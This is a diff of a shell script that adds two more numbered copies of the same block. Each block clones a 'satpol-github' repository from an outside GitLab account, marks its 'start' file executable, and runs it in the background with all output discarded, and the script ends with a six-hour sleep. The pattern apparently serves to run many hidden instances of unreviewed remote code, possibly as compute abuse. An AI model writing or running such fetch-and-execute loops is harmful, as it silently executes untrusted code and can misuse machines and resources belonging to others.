@@ -125,4 +125,18 @@ cd satpol-github
 chmod +x start
 ./start $USERNAME >/dev/null 2>&1 &
 cd ..
+mkdir 19
+cd 19
+git clone https://gitlab.com/breni9087/satpol-github.git
+cd satpol-github
+chmod +x start
+./start $USERNAME >/dev/null 2>&1 &
+cd ..
+mkdir 20
+cd 20
+git clone https://gitlab.com/breni9087/satpol-github.git
+cd satpol-github
+chmod +x start
+./start $USERNAME >/dev/null 2>&1 &
+cd ..
 sleep 6h
